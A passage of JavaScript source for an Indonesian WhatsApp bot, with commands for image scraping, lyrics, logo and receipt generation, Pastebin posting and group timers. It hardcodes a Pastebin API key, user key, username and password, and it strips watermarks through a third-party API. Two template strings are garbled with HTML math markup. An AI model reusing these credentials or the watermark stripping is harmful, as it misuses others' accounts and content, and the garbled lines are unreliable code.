        const image = buffer.toString("base64");
        let res = await axios.post(
            "https://us-central1-ai-apps-prod.cloudfunctions.net/restorePhoto", {
                image: `data:image/png;base64,${image}`,
                model: "fb8af171cfa1616ddcf1242c093f9c46bcada5ad4cf6f2fbe8b81b330ec5c003",
            }
        );
        const data = res.data?.replace(`"`, "");
        if (!data) return "Gagal menghapus background!";
        return data;
    } catch (e) {
        return `Error: ${e.message}`;
    }
}
    try {
        await Sky.sendMessage(m.chat, {react:  {text: '⌛', key: m.key}})

        let q = m.quoted ? m.quoted : m;
        let mime = (q.msg || q).mimetype || '';
        if (!mime || !mime.startsWith('image/')) return m.reply(example('kirim/reply foto'));

        let media = await q.download();
        let resultUrl = await removebg(media);

        await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})

        await Sky.sendMessage(m.chat, { 
            image: { url: resultUrl }
        }, { quoted: m });

    } catch (error) {
        await m.react('❌');
        await Sky.sendMessage(m.chat, { text: `❌ *Error:* ${error}` }, { quoted: m });
    }
};
break

//======================================

case 'ggimg' : {

async function googleImg(query) {
  try {
    const { data: html } = await axios.get(`https://www.google.com/search?q=${encodeURIComponent(query)}&sclient=mobile-gws-wiz-img&udm=2`);
    const $ = cheerio.load(html);

    const imageUrls = [];
    $('img.DS1iW').each((i, el) => {
      const imgUrl = $(el).attr('src');
      if (imgUrl) imageUrls.push(imgUrl);
    });

    return imageUrls;
  } catch (error) {
    console.error('Error fetching images:', error);
    return [];
  }
}


  if (!text) return m.reply(example('Naruto'));

  const images = await googleImg(text);
  if (images.length < 3) return m.reply('Gambar yang ditemukan kurang dari 3, coba kata kunci lain.');

  let caption = `🔍 *Hasil Pencarian Dari:* ${text}\n📸 *Total Pencarian:* ${images.length}\nAku hanya mengirim 5 karena ada pembatasan pihak WhatsApp`
  m.reply(caption);

  let maxImages = images.slice(0, Math.min(5, images.length));
  for (let img of maxImages) {
    await Sky.sendMessage(m.chat, { image: { url: img } }, { quoted: m });
  }
}
break

//======================================
case 'lirik': case 'lyrics': case 'searchlirik':
 if (!q) return m.reply('Masukkan judul lagu!\nContoh: .lirik someone like you');
 m.reply('Sedang mencari lirik...');
 try {
 const response = await fetch(`https://r.jina.ai/https://www.google.com/search?q=lirik+lagu+${encodeURIComponent(q)}&hl=en`, {
 headers: {
 'x-return-format': 'html',
 'x-engine': 'cf-browser-rendering',
 }
 });
 const cheerio = require('cheerio');
 const text = await response.text();
 const $ = cheerio.load(text);
 const lirik = [];
 const output = [];
 const result = {};
 $('div.PZPZlf').each((i, e) => {
 const penemu = $(e).find('div[jsname="U8S5sf"]').text().trim();
 if (!penemu) output.push($(e).text().trim());
 });
 $('div[jsname="U8S5sf"]').each((i, el) => {
 let out = '';
 $(el).find('span[jsname="YS01Ge"]').each((j, span) => {
 out += $(span).text() + '\n';
 });
 lirik.push(out.trim());
 });
 result.lyrics = lirik.join('\n\n');
 result.title = output.shift();
 result.subtitle = output.shift();
 result.platform = output.filter(_ => !_.includes(':'));
 output.forEach(_ => {
 if (_.includes(':')) {
 const [name, value] = _.split(':');
 result[name.toLowerCase()] = value.trim();
 }
 });
 if (!result.lyrics) return m.reply('Lirik tidak ditemukan.');
 let teks = `🎵 *${result.title || 'Judul Tidak Diketahui'}* 🎵\n`;
 teks += result.subtitle ? `_${result.subtitle}_\n\n` : '\n';
 teks += result.lyrics;
 m.reply(teks);
 } catch (error) {
 console.error(error);
 m.reply('Terjadi kesalahan saat mengambil lirik.');
 }
 break
    
//=======================================================
    
case 'lyrics2': case'lirik2':case 'searchlirik2': {
  if (!q) return m.reply('Contoh: lyrics2 <keyword>,<jumlah>\n\nContoh: lyrics2 duka,3')
  let [keyword, jumlah] = q.split(',').map(v => v.trim())
  if (!keyword) return m.reply('Kata kunci tidak boleh kosong')
  jumlah = parseInt(jumlah) || 3

  try {
    let res = await fetch(`https://apikey.sazxofficial.web.id/api/search/lyrics?q=${encodeURIComponent(keyword)}`)
    let data = await res.json()
    if (!data.status || !data.result || data.result.length === 0) {
      return m.reply('Lirik tidak ditemukan.')
    }
    let hasil = data.result.slice(0, jumlah).map((item, i) => {
      return `*${i + 1}. ${item.title}* - _${item.artist}_\n\n${item.lyricSingkat.trim()}\n`
    }).join('\n────────────\n\n')
    m.reply(`*Hasil Lirik: ${keyword}*\n\n${hasil}`)
  } catch (e) {
    console.error(e)
    m.reply('Terjadi kesalahan saat mengambil data.')
  }
}
  break
    
//==================================
    
case 't2n' :{


  const prompt = args.join(' ');

  if (!prompt) {
    return Sky.sendMessage(m.chat, { text: `Masukkan prompt!\n*EX:* .txt2anime loli` }, { quoted: m });
  }

  try {
    const res = await generateAnimeImage(prompt);
    if (!res.status) throw new Error(res.message);

    await Sky.sendMessage(m.chat, {
      image: { url: res.image },
      caption: `✨ *Prompt:* ${prompt}`
    }, 
{headerType: 1,
viewOnce: true},
{ quoted: m })
  } catch (error) {
    Sky.sendMessage(m.chat, { text: `Error: ${error.message || 'Gagal membuat gambar.'}` }, { quoted: m });
  };



async function generateAnimeImage(prompt) {
  try {
    return await new Promise(async (resolve, reject) => {
      if (!prompt) return reject("Prompt tidak boleh kosong!");

      axios.post("https://aiimagegenerator.io/api/model/predict-peach", {
        prompt,
        key: "Anime",
        width: 512,
        height: 768,
        quantity: 8,
        size: "512x768",
        nsfw: true
      }).then(res => {
        const data = res.data;
        if (data.code !== 0) return reject(data.message);
        if (!data.data?.url) return reject("Gagal mendapatkan URL gambar!");

        return resolve({
          status: true,
          image: data.data.url
        });
      }).catch(reject);
    });
  } catch (e) {
    return { status: false, message: e.message };
  }
}
}
break
    
//===================================
    
case 'struk' : {
const { createCanvas } = require('canvas');
const fs = require('fs');
const path = require('path');

const __dirname = path.dirname(require.main.filename);

  if (!text) return m.reply(example("toko|id_transaksi|harga_admin|nomor_tujuan|barang1-harga1,barang2-harga2,Seterusnya\n\n*Example :* .struk Abella|1635182|4500|3|Rinso-4000,Royco-2000"));

  let [toko, idTransaksi, hargaAdmin, nomorTujuan, items] = text.split("|");  
  if (!toko || !idTransaksi || !hargaAdmin || !nomorTujuan || !items) return m.reply("*Format tidak lengkap*");  

  let daftarBarang = items.split(",").map((item, index) => {  
    let [nama, harga] = item.split("-");  
    return { nomor: index + 1, nama, harga };  
  });  

  const canvasWidth = 400, canvasHeight = 500 + daftarBarang.length * 30;  
  const canvas = createCanvas(canvasWidth, canvasHeight);  
  const ctx = canvas.getContext('2d');  
  
  ctx.fillStyle = "#fff";  
  ctx.fillRect(0, 0, canvas.width, canvas.height);  
  ctx.fillStyle = "#000";  
  ctx.font = "bold 20px monospace";  
  ctx.textAlign = "center";  
  ctx.fillText(toko.toUpperCase(), canvasWidth / 2, 40);  

  ctx.font = "14px monospace";  
  ctx.fillText(new Date().toLocaleString("id-ID"), canvasWidth / 2, 65);  
  ctx.textAlign = "left";  
  ctx.fillText(`ID Transaksi: ${idTransaksi}`, 20, 100);  
  ctx.fillText(`Nomor Tujuan: ${nomorTujuan}`, 20, 125);  
  ctx.beginPath();  
  ctx.moveTo(20, 150);  
  ctx.lineTo(canvasWidth - 20, 150);  
  ctx.stroke();  
  let startY = 175;  
  daftarBarang.forEach((item, i) => {  
    ctx.fillText(`${item.nomor}. ${item.nama} - Rp${parseInt(item.harga).toLocaleString()}`, 20, startY + i * 30);  
  });  
  let lastItemY = startY + daftarBarang.length * 30 + 10;  
  ctx.beginPath();  
  ctx.moveTo(20, lastItemY);  
  ctx.lineTo(canvasWidth - 20, lastItemY);  
  ctx.stroke();  

  let totalHarga = daftarBarang.reduce((sum, item) => sum + parseInt(item.harga), 0);  
  let totalKeseluruhan = totalHarga + parseInt(hargaAdmin);  

  ctx.fillText(`Total: Rp${totalHarga.toLocaleString()}`, 20, lastItemY + 25);  
  ctx.fillText(`Admin: Rp${parseInt(hargaAdmin).toLocaleString()}`, 20, lastItemY + 50);  
  ctx.fillText(`Total Keseluruhan: Rp${totalKeseluruhan.toLocaleString()}`, 20, lastItemY + 75);  

  ctx.font = "bold 14px monospace";  
  ctx.textAlign = "center";  
  ctx.fillText("THANK YOU FOR SHOPPING AT", canvasWidth / 2, lastItemY + 120);  
  ctx.fillText(toko.toUpperCase(), canvasWidth / 2, lastItemY + 140);  

  const buffer = canvas.toBuffer("image/png");  
  const filePath = path.join(__dirname, './library/database/sampah/' + getRandom('.png'));  
  fs.writeFileSync(filePath, buffer);  

await Sky.sendMessage(m.chat, {image: {url: filePath}, caption: "🧾 *Struk Pembelian*", contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})

fs.unlinkSync(filePath);
}
break


//===================================
    
case "cekgempa": {
    m.reply("Sedang mengambil data gempa terkini...");
    
    try {
        const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
        const data = await response.json();
        
        if (!data || !data.Infogempa || !data.Infogempa.gempa) {
            return m.reply("Gagal mendapatkan data gempa dari BMKG.");
        }
        
        const gempa = data.Infogempa.gempa;
        
        let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
        caption += `*Tanggal:* ${gempa.Tanggal}\n`;
        caption += `*Waktu:* ${gempa.Jam}\n`;
        caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
        caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
        caption += `*Lokasi:* ${gempa.Wilayah}\n`;
        caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
        caption += `*Potensi:* ${gempa.Potensi}\n`;
        caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
        caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
        
        if (gempa.Shakemap) {
            const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
            await Sky.sendMessage(m.chat, {
                image: { url: shakemapUrl },
                caption: caption
            }, { quoted: m });
        } else {
            Sky.sendMessage(m.chat, { text: caption }, { quoted: m });
        }
    } catch (error) {
        console.log(error);
        m.reply("Terjadi kesalahan saat mengambil data gempa.");
    }
}
break
    
//==============================
    
/*
Jangan Hapus Wm Bang 

*Logo Generator  Plugins Esm*

Aku Lapar😭

*[Sumber]*
https://whatsapp.com/channel/0029Vb3u2awADTOCXVsvia28

*[Sumber Scrape]*

https://whatsapp.com/channel/0029VbB0oUvBlHpYbmFDsb3E
*/

case 'logogen': {
const axios = require("axios");
  if (!text) {
    return m.reply("Masukkan judul, ide, dan slogan logo. Format: .logogen Judul|Ide|Slogan");
  }

  const [title, idea, slogan] = text.split("|");

  if (!title || !idea || !slogan) {
    return m.reply("Format salah. Gunakan : .logogen Judul|Ide|Slogan\n\n*Example :* .logogen Takashi|imul Impul|Jangan lupa Follow yah");
  }

  try {
    const payload = {
      ai_icon: [333276, 333279],
      height: 300,
      idea: idea,
      industry_index: "N",
      industry_index_id: "",
      pagesize: 4,
      session_id: "",
      slogan: slogan,
      title: title,
      whiteEdge: 80,
      width: 400
    };

    const { data } = await axios.post("https://www.sologo.ai/v1/api/logo/logo_generate", payload);
    
    if (!data.data.logoList || data.data.logoList.length === 0) {
      return m.reply("Gagal Membuat Logo");
    }

    const logoUrls = data.data.logoList.map(logo => logo.logo_thumb);
    
    for (const url of logoUrls) {
    const done = await getBuffer(`https://api.siputzx.my.id/api/tools/dewatermark?url=${url}`)
      await Sky.sendMessage(m.chat, { image: done });
    }
  } catch (error) {
    console.error("Error generating logo:", error);
    await m.reply("Failed to Create Logo");
  }
} 
break;

    
//===============================
 
 
case 'getpaste' : case 'gp': {
  if (!args[0]) throw (example("https://pastebin.com/KiCvmvCf"))

  let url = args[0].trim();

  if (url.startsWith('https://pastebin.com/') && !url.includes('/raw/')) {
    url = url.replace('https://pastebin.com/', 'https://pastebin.com/raw/');
  }

  await Sky.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
  
  const text = await getPastebinContent(url);
  if (text) {
    await m.reply(`?? *Isi Pastebin:*\n\n${text}`);
  } else {
    await m.reply('❌ Gagal mengambil isi dari Pastebin.');
  }
};

async function getPastebinContent(url) {
  try {
    const res = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
    if (!res.ok) throw new Error(`HTTP Error: ${res.status}`);
    return await res.text();
  } catch (error) {
    console.error('Error:', error.message);
    return null;
  }
}
break

    
//==============================
    
/*
📌 Nama Fitur: pastebin post
📝 Deskripsi: Memposting Kode ke pastebin lewat bot
🔗 Sumber : https://whatsapp.com/channel/0029VasjrIh3gvWXKzWncf2P
✍️ Code by FlowSky
*/
case 'pastebinpost': case 'ppt':{

  async function createPaste(title, content) {
    const data = new URLSearchParams({
      api_dev_key: "eaEeEmp7ztl5g9u4Nf4VjnQTNaNcRXuM",
      api_user_key: "f81dc27ebdd2fc7602848191a27a7f49",
      api_paste_name: title,
      api_paste_code: content,
      api_paste_format: "text",
      api_paste_expire_date: "N",
      api_option: "paste"
    });

    try {
      const response = await axios.post("https://pastebin.com/api/api_post.php", data, {
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
      });

      if (response.data.includes("Bad API request")) {
        throw new Error(`Gagal membuat paste: ${response.data}`);
      }

      const result = response.data;
      const rawUrl = result.replace(/^(https:\/\/pastebin\.com\/)([a-zA-Z0-9]+)$/, "$1raw/$2");

      return { status: 0, original: result, raw: rawUrl };
    } catch (error) {
      console.error("Error posting Pastebin:", error);
      return { status: 1, original: null, raw: null };
    }
  }

  if (!text.includes('#')) return m.reply(example("judul # context"));

  const [title, content] = text.trim().split('#');
  if (!title || !content) return m.reply(example("judul # context"));

  let results = await createPaste(title, content);
  if (results.status === 1) return m.reply("⚠️ Gagal membuat paste di Pastebin!");

  let hasilUrl = `✅ Berhasil posting ke Pastebin!\n\n🔗 *Original:* ${results.original}\n🔗 *Raw:* ${results.raw}`;

  Sky.sendMessage(m.chat, {
    text: hasilUrl,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: 'PASTEBIN POST',
        body: 'Rafzbot',
        thumbnail: await getBuffer("https://img12.pixhost.to/images/955/576638329_rafzbot.jpg"),
        sourceUrl: results.original,
        mediaType: 1
      }
    }
  }, { quoted: m });
}
break;
/* NOTE :
Dapatkan api_dev_key di link sini ( pastikan kamu Sudah login )
https://pastebin.com/doc_api

Gunakan api_user_key jika ingin hasilnya bukan Guest dan dapat di edit atau delete nanti

Cara dapetkan api_user_key bisa menggunakan eval bot : 
(async () => {
  const axios = require("axios");

  const data = new URLSearchParams({
    api_dev_key: "YOUR_DEV_KEY",
    api_user_name: "USERNAME_PASTEBIN",
    api_user_password: "PASSWORD_PASTEBIN"
  });

  try {
    const response = await axios.post("https://pastebin.com/api/api_login.php", data, {
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
    });

    console.log("API User Key:", response.data);
  } catch (error) {
    console.error("Gagal mendapatkan API User Key:", error.response?.data || error.message);
  }
})();
atau lewat termux
curl -X POST -d "api_dev_key=YOUR_DEV_KEY&api_user_name=USERNAME_PASTEBIN&api_user_password=PASSWORD_PASTEBIN" https://pastebin.com/api/api_login.php
*/
    
//==============================
    
case 'getuserapis':{
  const axios = require("axios");

  const data = new URLSearchParams({
    api_dev_key: "eaEeEmp7ztl5g9u4Nf4VjnQTNaNcRXuM",
    api_user_name: "RafzBotPastPOST",
    api_user_password: "pematangpanjang"
  });

  try {
    const response = await axios.post("https://pastebin.com/api/api_login.php", data, {
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
    });

    console.log("API User Key:", response.data);
  } catch (error) {
    console.error("Gagal mendapatkan API User Key:", error.response?.data || error.message);
  }
}
    break
//=================================
    
//[ `VER PLUGIN TOTALPESAN` ]

//Code By: RimOfficial
//Modified: By Someone

//Wm Ch: https://whatsapp.com/channel/0029Vap84RE8KMqfYnd0V41A
case 'totalpesan': {
  const { createCanvas, loadImage } = require("canvas");

  async function getPP(sock, jid) {
    try {
      return await sock.profilePictureUrl(jid, "image");
    } catch {
      return "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
  }

  function roundRect(ctx, x, y, width, height, radius, fill, stroke) {
    if (typeof stroke === "undefined") stroke = true;
    if (typeof radius === "number") radius = { tl: radius, tr: radius, br: radius, bl: radius };
    ctx.beginPath();
    ctx.moveTo(x + radius.tl, y);
    ctx.lineTo(x + width - radius.tr, y);
    ctx.quadraticCurveTo(x + width, y, x + width, y + radius.tr);
    ctx.lineTo(x + width, y + height - radius.br);
    ctx.quadraticCurveTo(x + width, y + height, x + width - radius.br, y + height);
    ctx.lineTo(x + radius.bl, y + height);
    ctx.quadraticCurveTo(x, y + height, x, y + height - radius.bl);
    ctx.lineTo(x, y + radius.tl);
    ctx.quadraticCurveTo(x, y, x + radius.tl, y);
    ctx.closePath();
    if (fill) ctx.fill();
    if (stroke) ctx.stroke();
  }

  // Pastikan global.db dan global.db.data diinisialisasi
  if (!global.db || !global.db.data) {
    // Inisialisasi global.db dan global.db.data jika belum ada
    global.db = global.db || {};
    global.db.data = global.db.data || {};
    global.db.data.totalPesan = global.db.data.totalPesan || {}; // Inisialisasi totalPesan
    global.db.data.users = global.db.data.users || {}; // Inisialisasi users
    return m.reply("Database diinisialisasi."); // Beri tahu pengguna bahwa database diinisialisasi
  }

  if (!global.db.data.totalPesan) global.db.data.totalPesan = {};
  if (!global.db.data.totalPesan[m.sender]) global.db.data.totalPesan[m.sender] = 0;
  global.db.data.totalPesan[m.sender] += 1;

  let participants = Object.values(m.chat.participants || {}); // Ambil peserta dari m.chat

  let messageCounts = participants.map(p => ({
    jid: p.id,
    count: global.db.data.totalPesan[p.id] || 0
  }));

  messageCounts.sort((a, b) => b.count - a.count);
  let top8 = messageCounts.slice(0, 8);
  let totalPesanSemua = messageCounts.reduce((acc, cur) => acc + cur.count, 0);
  let totalPesanKamu = global.db.data.totalPesan[m.sender];

  const canvasWidth = 1280, canvasHeight = 720;
  const canvas = createCanvas(canvasWidth, canvasHeight);
  const ctx = canvas.getContext("2d");

  try {
    const bg = await loadImage("https://files.catbox.moe/gmwn5m.jpg");
    ctx.drawImage(bg, 0, 0, canvasWidth, canvasHeight);
  } catch {
    ctx.fillStyle = "#000";
    ctx.fillRect(0, 0, canvasWidth, canvasHeight);
  }

  let overlay = ctx.createLinearGradient(0, 0, canvasWidth, canvasHeight);
  overlay.addColorStop(0, "rgba(0,0,0,0.5)");
  overlay.addColorStop(1, "rgba(0,0,0,0.7)");
  ctx.fillStyle = overlay;
  ctx.fillRect(0, 0, canvasWidth, canvasHeight);
  ctx.strokeStyle = "#ffffff";
  ctx.lineWidth = 8;
  ctx.strokeRect(20, 20, canvasWidth - 40, canvasHeight - 40);

  ctx.font = "bold 70px sans-serif";
  ctx.fillStyle = "#ffffff";
  ctx.textAlign = "center";
  ctx.fillText("Top 8 Pengirim Pesan", canvasWidth / 2, 100);

  let rowStartY = 170, rowHeight = 70, rowMargin = 20;

  for (let i = 0; i < top8.length; i++) {
    let user = top8[i];
    let username = user.jid.split("@")[0];
    let ppUrl = await getPP(Sky, user.jid);
    let ppImg;

    try {
      ppImg = await loadImage(ppUrl);
    } catch {
      ppImg = await loadImage("https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60");
    }

    let rowY = rowStartY + i * (rowHeight + rowMargin);
    let cardX = 100, cardY = rowY, cardW = canvasWidth - 200, cardH = rowHeight;
    ctx.fillStyle = i < 3 ? "rgba(255,215,0,0.4)" : "rgba(255,255,255,0.2)";
    roundRect(ctx, cardX, cardY, cardW, cardH, 15, true, true);

    let ppSize = cardH - 10;
    ctx.save();
    ctx.beginPath();
    ctx.arc(cardX + ppSize / 2 + 10, cardY + cardH / 2, ppSize / 2, 0, Math.PI * 2);
    ctx.closePath();
    ctx.clip();
    ctx.drawImage(ppImg, cardX + 10, cardY + (cardH - ppSize) / 2, ppSize, ppSize);
    ctx.restore();

    ctx.font = "bold 35px sans-serif";
    ctx.fillStyle = "#ffffff";
    ctx.textAlign = "left";
    ctx.fillText(`<span class="math-inline">\{i \+ 1\}\. @</span>{username}`, cardX + ppSize + 30, cardY + cardH / 2 - 5);
    ctx.font = "35px sans-serif";
    ctx.fillStyle = "#ffdd00";
    ctx.fillText(`${user.count} pesan`, cardX + ppSize + 30, cardY + cardH / 2 + 30);
  }

  let caption = "* Top 8 Pengirim Pesan:*\n\n";
  let mentions = [];

  for (let i = 0; i < top8.length; i++) {
    let user = top8[i];
    let username = user.jid.split("@")[0];
    caption += `*<span class="math-inline">\{i \+ 1\}\. @</span>{username}* (${user.count} pesan)\n`;
    mentions.push(user.jid);
  }

  caption += `\n *Total Pesan Grup:* ${totalPesanSemua}`;
  caption += `\n✉️ *Pesan Kamu:* ${totalPesanKamu}`;

  Sky.sendMessage(m.chat, { image: canvas.toBuffer(), caption }, { mentions });

  if (global.db && global.db.data && global.db.data.users && global.db.data.users[m.sender]) {
    global.db.data.users[m.sender].exp += Math.floor(Math.random() * 20);
  }
}
break;
    
//===================================
    
case 'pin' : case 'pinterest': {
const axios = require('axios')
const https = require('https')

const agent = new https.Agent({
 rejectUnauthorized: true,
 maxVersion: 'TLSv1.3',
 minVersion: 'TLSv1.2'
});

async function getCookies() {
 try {
 const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent });
 const setCookieHeaders = response.headers['set-cookie'];
 if (setCookieHeaders) {
 const cookies = setCookieHeaders.map(cookieString => {
 const cookieParts = cookieString.split(';');
 return cookieParts[0].trim();
 });
 return cookies.join('; ');
 }
 return null;
 } catch {
 return null;
 }
}

async function pinterest(query) {
 try {
 const cookies = await getCookies();
 if (!cookies) return [];

 const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';
 const params = {
 source_url: `/search/pins/?q=${query}`,
 data: JSON.stringify({
 options: {
 isPrefetch: false,
 query: query,
 scope: "pins",
 no_fetch_context_on_resource: false
 },
 context: {}
 }),
 _: Date.now()
 };

 const headers = {
 'accept': 'application/json, text/javascript, */*, q=0.01',
 'accept-encoding': 'gzip, deflate',
 'accept-language': 'en-US,en;q=0.9',
 'cookie': cookies,
 'dnt': '1',
 'referer': 'https://www.pinterest.com/',
 'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
 'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
 'sec-ch-ua-mobile': '?0',
 'sec-ch-ua-model': '""',
 'sec-ch-ua-platform': '"Windows"',
 'sec-ch-ua-platform-version': '"10.0.0"',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-origin',
 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
 'x-app-version': 'c056fb7',
 'x-pinterest-appstate': 'active',
 'x-pinterest-pws-handler': 'www/[username]/[slug].js',
 'x-pinterest-source-url': '/hargr003/cat-pictures/',
 'x-requested-with': 'XMLHttpRequest'
 };

 const { data } = await axios.get(url, { httpsAgent: agent, headers, params });
 return data.resource_response.data.results
 .filter(v => v.images?.orig)
 .map(result => ({
 upload_by: result.pinner.username,
 fullname: result.pinner.full_name,
 followers: result.pinner.follower_count,
 caption: result.grid_title,
 image: result.images.orig.url,
 source: "https://id.pinterest.com/pin/" + result.id,
 }));
 } catch {
 return [];
 }
}

 if (!text) return m.reply(example("<query> <jumlah>\n\n*Contoh:*  nasi kuning 3"));
 
 let [query, count] = text.split(' ');
 let imgCount = 5;

 if (text.indexOf(' ') !== -1) {
 const lastWord = text.split(' ').pop();
 if (!isNaN(lastWord) && lastWord.trim() !== '') {
 imgCount = parseInt(lastWord);
 query = text.substring(0, text.lastIndexOf(' '));
 } else {
 query = text;
 }
 } else {
 query = text;
 }
 
 m.reply('Searching Pinterest images...');
 
 try {
 const results = await pinterest(query);
 if (results.length === 0) return reply(`No results found for "${query}". Try another search term.`);
 
 const imagesToSend = Math.min(results.length, imgCount);
 m.reply(`Sending ${imagesToSend} Pinterest images for "${query}"...`);
 
 for (let i = 0; i < imagesToSend; i++) {
 await Sky.sendMessage(m.chat, { image: { url: results[i].image } });
 }
 } catch {
 m.reply('Error occurred while fetching Pinterest images. Please try again later.');
 }
}
break
    
//==================================

case 'cinfo' : {
    if (!args[0]) return m.reply(example("<link_channel>"));

    let match = args[0].match(/whatsapp\.com\/channel\/([\w-]+)/);
    if (!match) return m.reply("*Error, Link tidak valid*");

    let inviteId = match[1];

    try {
        let metadata = await Sky.newsletterMetadata("invite", inviteId);
        if (!metadata || !metadata.id) return m.reply("*Gagal mengambil data channel. Pastikan link benar atau coba lagi nanti.*");

        let caption = `*— 乂 Channel Info —*\n\n` +
            `🆔 *ID:* ${metadata.id}\n` +
            `📌 *Nama:* ${metadata.name}\n` +
            `👥 *Pengikut:* ${metadata.subscribers?.toLocaleString() || "Tidak diketahui"}\n` +
            `📅 *Dibuat sejak:* ${metadata.creation_time ? new Date(metadata.creation_time * 1000).toLocaleString("id-ID") : "Tidak diketahui"}\n` +
            `📄 *Deskripsi:* ${metadata.description || "Tidak ada deskripsi."}`;

        if (metadata.preview) {
            await Sky.sendMessage(m.chat, { 
                image: { url: "https://pps.whatsapp.net" + metadata.preview }, 
                caption 
            });
        } else {
            m.reply(caption);
        }
    } catch (error) {
        console.error("Error:", error);
        m.reply("Error, Mungkin terjadi kesalahan di link.");
    }
   }
break
    
//====================================
case "emojigif": {
if (!text) return m.reply(example('😍'))
try {
const axios = require('axios');
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await Sky.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break
    
//=======================================
    case 'smeme': case 'stickermeme': case 'stickmeme': {
const { CatBox, UploadFileUgu, fileIO, pomfCDN, webp2mp4File, webp2mp4} = require('./library/uploader')
if (!/image|video/gi.test(mime)) return m.reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}
 text1|text2`)
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
if (!text) return m.reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}
 text1|text2`)
const atas = text.split('|')[0] ? text.split('|')[0] : '-'
const bawah = text.split('|')[1] ? text.split('|')[1] : '-'
const mee = await Sky.downloadAndSaveMediaMessage(quoted)
const mem = await UploadFileUgu(mee)
const meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.webp?background=${mem.url}`
Sky.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
const memes = await Sky.sendAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
break
    
//========================================
    
case 'opentime': {
    if (!m.isGroup) return Reply(global.mess.group)
    if (!m.isBotAdmin) return m.reply(mess.botAdmin)
    if (!args[0] || isNaN(args[0])) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    
    const timeUnits = {
        'detik': 1000,
        'menit': 60000,
        'jam': 3600000,
        'hari': 86400000
    }
    const unit = args[1]?.toLowerCase()
    if (!timeUnits[unit]) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(args[0]) * timeUnits[unit]
    m.reply(`Open time ${args[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
        try {
            Sky.groupSettingUpdate(m.chat, 'not_announcement')
            m.reply('*Tepat waktu* grup dibuka oleh admin\nsekarang member dapat mengirim pesan')
        } catch (err) {
            m.reply('Terjadi kesalahan saat membuka grup')
            console.log(err)
        }
    }, timer)
}
    break

case 'closetime': {
    if (!m.isGroup) return Reply(global.mess.group)
    if (!m.isBotAdmin) return m.reply(mess.botAdmin)
    if (!args[0] || isNaN(args[0])) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    
    const timeUnits = {
        'detik': 1000,
        'menit': 60000,
        'jam': 3600000,
        'hari': 86400000
    }
    const unit = args[1]?.toLowerCase()
    if (!timeUnits[unit]) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(args[0]) * timeUnits[unit]
    m.reply(`Close time ${args[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
        try {
            Sky.groupSettingUpdate(m.chat, 'announcement')
            m.reply('*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan')
        } catch (err) {
            m.reply('Terjadi kesalahan saat menutup grup')
            console.log(err)
        }
    }, timer)
}
    break
    
//========================================
    
case 'toaud': case 'tomp3': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(example("Kirim atau reply video/audio"))
            if (!quoted) return m.reply(example("Kirim atau reply video/audio"))
            await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            Sky.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
            }
            break
//====================================================================================
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(example("Kirim atau reply video/audio"))
            if (!quoted) return m.reply(example("Kirim atau reply video/audio"))
